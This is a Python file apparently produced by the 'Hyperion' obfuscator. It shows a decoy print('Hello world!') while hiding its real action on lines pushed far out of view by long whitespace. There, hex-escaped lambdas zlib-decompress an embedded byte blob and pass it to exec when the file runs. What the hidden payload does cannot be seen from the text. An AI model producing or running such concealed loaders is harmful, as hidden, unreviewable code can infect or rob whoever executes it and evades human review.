from builtins import *
from math import prod as _cube


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Run, While, _theory, Positive, _stackoverflow, Substract, _statistics = exec, str, tuple, map, ord, globals, type

class _builtins:
    def __init__(self, _add):
        self.Walk = _cube((_add, 60163))
        self.Divide(_run=82412)

    def Divide(self, _run = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Walk += -24048 * _run
        
        try:
            ((_stackoverflow, _stackoverflow) or While if (_stackoverflow, _stackoverflow) and While else ... or (While, (_stackoverflow, _stackoverflow)))

        except AssertionError:
            (Positive, While, Positive) if Substract == Positive else (Positive, While, Positive) <= _theory

        except:
            _statistics(57562 * 58070) == str

    def MemoryAccess(self, _memoryaccess = 64127):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess *= 92015 - -56484
        self.Power != bool
        
        try:
            ((_stackoverflow, _stackoverflow) or While if (_stackoverflow, _stackoverflow) and While else ... or (While, (_stackoverflow, _stackoverflow)))

        except OSError:
            (_stackoverflow, _stackoverflow) if Positive is Substract else (_stackoverflow, _stackoverflow) is _theory

        except:
            _statistics(-36398 / 5875) == str

    def _hypothesis(Frame = str):
        return Substract()[Frame]

    def _substract(Add = 76174 * 65940, _detectvar = int, Square = Substract):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Square()[Add] = _detectvar
        
        try:
            ((Run, {Positive: Product}) for Run in (Positive, Positive, While) if Substract is Positive)

        except AssertionError:
            ((While, (_stackoverflow, _stackoverflow)) for While in (Positive, While, Positive) if _stackoverflow is Run)

        except:
            _statistics(31411 - -44901) == False

    def execute(code = str):
        return Run(While(_theory(Positive(_stackoverflow, code))))

    @property
    def Power(self):
        self._positive = '<__main__.Divide object at 0x000003093BE53856>'
        return (self._positive, _builtins.Power)

if __name__ == '__main__':
    try:
        _builtins.execute(code = __code__)
        _modulo = _builtins(_add = 26638 - -99790)

        _builtins(_add = -84909 - -71699).MemoryAccess(_memoryaccess = -74377 * _modulo.Walk)                                                                                                                                                                                                                                                          ;_builtins._substract(Add='IllIllIllIlllllIIlIIIlll',_detectvar=b'x\x9c\xddZm\x8f\xe26\x10\xfe|\xfc\n\xca\x97\x10\xdd\xdenH\x1c\x87 \xdd\x97\x8aV=\xa9\x07U\xb7\xeanuwB\x818\xbb\xa1&F$\x14\xf6\xdfw\xc6/\xe1m\x81\xc0\xb2\xd7j\xe38~\x1b\xdb\xc9\xe3\xf1\xcc\xd8q1{\xea\xd4\xeap\xa5IS\x86x\r\x06b\x98\xcc\xf3QT\x88\xd9`P\xff\xe1c\xe3\x97\xa7)\x9b\xa5"k\xd4\xc5l\x8d,\x9a\x17\x8fb\x96K\x9afc\x98r\xfeT<\xb2\x07\x11\x15\x9eO\x1bW\x8d\x1f\xf9\x9c\xfd\xce\xe2\x86\xbdQ\xeb!-\x1e\xe7C\xd5\xf0cQL\xf3\xce\xcd\x8d\xca\xbb\x1e\x89\xc9\xcdV37{\xfa\x8e\xd3|$f\xf1f3:\xf3\xfa\xe1\xe1f\xca\xa3\x879\xdb\xaa\xc4\xd3\x11\xcbr\xa6*\xfd\xf4\xdb\xaf\x1f\xdckg\x8bd$bUnMgiV4\x1b\xbf0\xceE}!f<\xfe\xa1a[5\xbbSRc\xb9\x95\xff\x9d\xc6\x96]c\xcb\x11\x9b\x16\x1a\xccl:\x87\x9a\xbf\x8b\x9c\xe5\xf5h\xc6\xea3\x16\x7f\xcd\xfeL\x05g\x85\xca\x18\x022_\xb3\xbf\xc4\\\xa6\xa2:6\xf25\xeb\x89\xa1\x88\x9f\xea<\xfd\x1b\xea=\x89y\xc3\xae\xa9\x97J\'S1+\x06\x03\xe8\xed)\xb7\xeck\xb6L\x8b\xa6]\xe3b\x14\xf1\xbci\x7f\xb1z\x9f\xf1\xeaa \xa3=\x8c\xf7z\xd6\xb7\x8f\x0f\\\x0c\x81\xa8\xb6\x87\x02+\xf7E\xbf\xdb\x17\xa2\xdf\xc7[\xc6\xbb*j}\xe9t\xde\x7fx\xff\xa1\xf9\xa1\xf9\xbee\xdb\xdf\xa05VDE1;\xd4\xda\xfd\xfd\xdd\xdd=<\xd0\xdd\xe1s\xb7\x958=\xd8\xc2r\xb1\x94\x97\x0c\x16\x0bs\xc3\xc7\xa8\x0f\xae\xed!\xc0\xba\x18*\xb7P\xe5Pk\x85\xdfa\x14\x9c\xbe\xe38\xf0\xd9\xa2\xef\xc0\xdd\x97IH@\x0b;\xad6\xad\xe1<\xe5E\x9a\xe1h\xfc\x13\xcd\xf2\xda\xde\xea\xd8\xf6\xed\xad\xab/\x19\xc1\xe4-4\xab0\xef\xee\xc0\xdfo>\xd3a\x9a\x8e\xf2(K\x87\xdbp\xdaW%\xd2\x12wx\x9cT\xdd\xfe\xf2\xc2\xfa\xd7i\x163\xa0xJR\xbed\x8f\xd9|\x87\xe4\x9b}h\xc8p<zr<z\x9f\xf5\xc0\xf4>\x9f\x8aN\x9e\xa5\x05O\xe7\xe7\xa2\xb3\xb7zEt\xf6\xd77\xe8\xb0\x9cG??\x87\xccA\xc61\xac\xaa\x9d\x82\xe9\xed\x813+\xf2\x93\xa1\xc1/\x16\xa2\x8b\x9f\r\xf2\ne\x16\x84\x80\x8ce]\x8fE\x9a\x1d\x9a\xea@\xda\xef\xe2%\xba(\xec\xe4\xf5\xe60-"\xc1\x93\xe7P=,\xbb\xb1\xef\xbb\xb2\xef7\x87\n\xe3\xe9t"F\'\xe2\x92e\xd9d\x02\xf7\x04\xc2L^\x98|s\xe0p!vK\x0f\x0bo\x85\xc5D\xa2\xa3q\xc9\xde\x1e.\xd1?\xecT\\4&\x12\x17\xc53o\x11\x196\x9f\xfdq\xe2\\\x02\x01\xee\xf4\xfb \xca\x85\x94\xec\xf2\xd1_o\xe39\x96j>gA5\x87\x96G\xfd\xc4\xf3\xc0\xfb\xe0\xa9\x0e\t\xf8\x16\xf8\x10\xcb\xdc\xa1\xdbv\xe3\xa3t\xae\x1b\x82%\x1734\xff\x9bV;)v\xad\x18[\xda\xaeok\xfcFl\xf9,g\x1f\xd2\xbc{\x86\xc2\x0f6\\[z\xe5\x825\xaf\xd2\xc11\xb0\xbf}<\x85\r\xdc pi\xec:n\x0c!\x850\t<J\xa8G[\x90&nB\x08M\x82\x802:\xa2\tmA\xce\xd1\xfe\xcf\x83\x00\xd8\xcd8\xdf[w\x98\xde\xcc\xf3\xdc\xe3\x10\xf0h2\x8c\xa3\xfa\xad\xba\\\xe5e\x9f\xb7n\xe7\xc0\xfb\x9d\xf3\xee\x08\x11!$!\x12,\x0c\xa9\x8a\x81\x97%D\x95b\xfc\xd2\x83\xe7\x05A\xe4:\x81\xff\xdc\xc0\x11\x8f\x84$v\x99\xa2q#(#\x07\xe8\x90\x05\x1c\x1f\xf2)\x95e\x01\xc4X@\xa8\x0f\x83\x1f@\x1d\x9f\x0e!gDC\xa4\xa41mS\xff\x95\x98\x81$\x9e\xe39\x08\x18\xc2i\xe2D\xa7\x14\xc4\nP,\xab\xcc\x0c\xe5,_\xaa\xc7ry6\'XJ(\xaf\xf9\xa3b\xd8\xb2\xddAk\x10\x0c\xc2\x813hC\xac\x051\x0f\x88\xbd\xdd\xdc\nm\xb5\xa0\xd09[\xf4\x07 \xb6\x8d\x0f\xb58o\xa3(7\xa2\x1fE\xbd\x16\xffUh\xfdj*\xc0\xf8rD>\xe1\xc59x\xfd\xec\xec\xb5\x0b\xce\xe1#\xc5?8\xf9tXNTS\xa2\xa6ge\x0e\xd2oj.\xf5\xfa\x9f\xce\xe7"m\x15kk\x07#g\x0f)\xd1\xc3\xd1\xd6\xde\xd1>\xd4C\xe7IM\xad\x86\xb4\nm\xab\xaaV\xd7\xd0\xf4J\x8bE\xfa2\xd9\xbb\xec\x90\x9a\x89\x8f\x82@\x89\x86U\xa8\xc4\x04\x864Q\xf1\xef\xab*}\x87\x86\xd4\x0b\x08\xe8h\x97\xfa\x81\xf7R\xe9h\x99\xd5\xe4}i\xac\xdcU\x10\r\x0e\x14\xb6\xce\xe6\xa3\x96\x1bK\x1eq\xaaO\xe9\xb5\xe9!g\xb1\x9a\x18\x18\xeb\xec5f\xcf\xd3\xb3Z\xcbj\x0ePS\x9b\x94\xd7j\xba_z\xdc_I\xcf\xa12\x05?\xa2\x91\x8c\x85\x10F2\x15\xe9\x12\x08\xbf\x9f\xc1\xb0\xc3\xbeG\x0c\x87\x1d\xfa\xff\x91\x01\xc1\xc0\xc5\xe0\x98\xf4\xac\x8c\xc5+WY\xe8\xe3J\x05\x16[\xb8\xe8\x92}\x0bL\xc0J\xecL\xe6\xb6\xb8V!r\x86(\x0f\xa9\x8b\xe9|\xb43\x82\x01\xd56\x853\xf0\xb4\x95\xb1\x95W\xa1\x1d\x7f\xe0C\x1d\n\xd4\xea\xe9\x0e\x08\x10\xd3\xdd\xdc\xb3\x85\x8d\xa3\x85MEe\xb3iC\\\xceP\xdeZ\xe1\x1c5\x98\xb7\xe8\xffG|/\xcdc\x9a(\xfd\xb7\xd2\x94\xcah6\xf1\x95~<\xc1x\xe6\xe34My:\x1e\xa7\\\xde\xe8\xc7c~\xe9\xb5\x14@\x86\x101\xe9LL\x85:\xf7;/\x7fa()\x81x\x02\xc2\xee\xc5\x8b_\x8bk\xc5\xc8KE\x89w\x85\xb9H`\xd6\x06j\xb6\xc1\xfcs\xc1\x834x\xef\xef\xe6Vh\xcb\x03)@\xa1f(k\xe2\x1c\x0e\x81\x98\xec\xe6Vh\x8b\xc2\x8a\xa5\r\x0ekb\xad\xf6\xc0\x07\xe2`7\xb7\xd2{\x11\xd9w\x08\xdfD\xc0\x83\x93\xef\xb5\x93[\t/\x94w-\xe8\x1f\xe5\x15~U[\xe2\xb5\x93{\xb6\xec\n\xf5\x16\x98\xab\x8d\xe8\x961\xb2\xb5GC\x9ah\x83\xbb\n\xadw\xba\x0c\xdc1\xc0\x8c\x99\x8d+\xdc\xc5\xc2\xd8\xdc\x97\x9e\xa3z3jsk\xca<\xd7\xcb.\xbfY\xe5\x82\xd1\xd1\x02Y\x0e\x12\x1a\x840\xceP\x07f\xa8\x07.\t|\x14\xba\xae\xe3\xa1\xe8>\xbaCtd\x9e.\xcdf\xa0Br\xb1\xf8^\xf6\xf4\xa57\xef\xf4\xde\xce+\xd9\xafh\xa9\x86\xdaG\xda\x8e5\xb6\xac\xca\xbf\xb8\xfd\nz\x16-\xe3\x16hQ\xd4\xaa\x0c\x18 \xd6\x9a\xd6\x97\xf9\x10CMK\x86\x90\x1bSWk\xde\xd72\xe0Ih<Q\xa6\xbc\x8e\x19\xbf\xca\xc1\xf0\xd2\xb3\x01>\x13\x8d\x8d@~\xe4\x9asY\xe9^:\x13\xfa\xb2\x08\xf3\x85\xfc\xf5 \xff>\x9c\xff\xd3\xc1l9\x04\xfag\xc2\xba\x14\xa4zw\xc9lST\xa1\xad\xbcMq\xe2\xb4r\x80\xbb\x02\x17W8\x0c\x84\rQ\x00\x83\xfd\xe8\xa0mH\xc3\xc0y\xb1)\x80}\xcaMi\xedd\xe7\xb7g\x03\xeb\x19\xf0\xf4^\x0e\xd5\xfb9&$k\xea\xa8\nmEut*\xc7\x02\xbf\xc6\x00f\x88`\xbe\x86\xe4>\xa6\xb2\xb6\xd4\xd3\xab)\xaaC\xeb\x8dM\x93\xf2\xd8jc\x93\xfa?XkXc\x9e*\xdb?\x95\xebVxbl<~\x91\x100{\x8ef+\xb9\xa5\xf9\xce\xf0\x9f\xbf&\x04\x8e\xd1\x92\x13\xf7*\xf5\xe2[-\xbf\xd5\xfa[Z\xe3\x07\xb6*\x93\x99\x98\xd4\xcd\xc1\xb5\xba:\x14WgK6\xba\x92\'\x16\xaf\xe4\x89G\x88\x175\xcclv\xbb ,Qb\x9a\xd32\xf8\xa3\xd3\xae\xe9z"\xbf\xca\x9f\xf2Z\xcc\x92\xfa$\x9aL\xe7y\xd3\xee\xd4\xde\x15x\xa0\xf4\xdd;\x91_Ca\xc1&My8\xa7\x8b\xbfI\xbbxX\xa7\xdb\x95gu\xec\r\x1ai\x9c\x18;\x05\xdf{\xb3X\x0e\x16\x0c\x1f\xac\xd4\xe0\x865\x1b\xdf,\x97/\xa9\x86\xde\x91\xe3/\x7f1\x8b\xadFJ\x84\xca\xedoxn\xd2\xdc\xdd\xad\x0e\xbf\xdc\xaf~\xaen\x11\xa9\xff\xad\xea\xa0\x0c>6\x8b\x15\xeb\xc8=q\xf5\xe3\x1f\x8bs\xc6Y\x1e\xa50\x04\xef\xcc9\xd1\x8d\x0f\x90\xdc\x8a7\xee\xd28Z[aEu\x06\x15\xd6\xabr\x9d:\x960 \x0b\xdb\x12\xf7\xb2Yh.\xfa\xa8N\x9d*\t\xbc\x12\xc82p\xa1\xad\xa1&\xb8+?m\xfdK\x80@\xf5\x85L\xb5Z\xd6q\x1d\xe1\x9f\xec\x9a\x19\xe5\xda\xbf\xcd\xe9\xe6\xc8')

        if 496011 > 2482174:
            _modulo.Divide(_run = _modulo.Walk / 70796)
        elif 226070 < 1914964:
            _builtins(_add = 307 + 25283).MemoryAccess(_memoryaccess = -46909 / _modulo.Walk)                                                                                                                                                                                                                                                          ;MNMMNNMNNNNNMMMMMNM,OODoOOOoDOOODODDDoDOD,NMMMNMMNMMMNNNMMNNNM,JJIILILLLIJLLLIIJILLLLJJ,MMNMMMNMNNNMMNMNM=(lambda IIJJJJIJJJIJILIIJLLLJJLJ:IIJJJJIJJJIJILIIJLLLJJLJ(__import__('\x7a\x6c\x69\x62'))),(lambda IIJJJJIJJJIJILIIJLLLJJLJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIJJJJIJJJIJILIIJLLLJJLJ)"),filename='\x6f\x4f\x4f\x44\x6f\x6f\x44\x6f\x4f\x4f\x6f\x44\x44\x6f\x44\x6f\x44',mode='\x65\x76\x61\x6c'))),(lambda IIJJJJIJJJIJILIIJLLLJJLJ:IIJJJJIJJJIJILIIJLLLJJLJ['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda IIJJJJIJJJIJILIIJLLLJJLJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIJJJJIJJJIJILIIJLLLJJLJ)"),filename='\x6f\x4f\x4f\x44\x6f\x6f\x44\x6f\x4f\x4f\x6f\x44\x44\x6f\x44\x6f\x44',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda wxwwwwwwwxwxwxxxx,IIJJJJIJJJIJILIIJLLLJJLJ:wxwwwwwwwxwxwxxxx(IIJJJJIJJJIJILIIJLLLJJLJ))
        if 146767 > 1984476:
            _builtins(_add = -68861 - -68687).Divide(_run = _modulo.Walk / -2659)
        elif 415738 < 8161849:
            _modulo.MemoryAccess(_memoryaccess = 3161 / _modulo.Walk)                                                                                                                                                                                                                                                          ;JJIILILLLIJLLLIIJILLLLJJ()(MMNMMMNMNNNMMNMNM(NMMMNMMNMMMNNNMMNNNM(MNMMNNMNNNNNMMMMMNM(OODoOOOoDOOODODDDoDOD('\x76\x61\x72\x73'))),_builtins._hypothesis(Frame='IllIllIllIlllllIIlIIIlll')))

    except Exception as Product:
        if 353225 > 9540464:
            _builtins.execute(code = While(Product))

        elif 411253 > 7768124:
            _modulo.Divide(_run = _modulo.Walk * 87380)
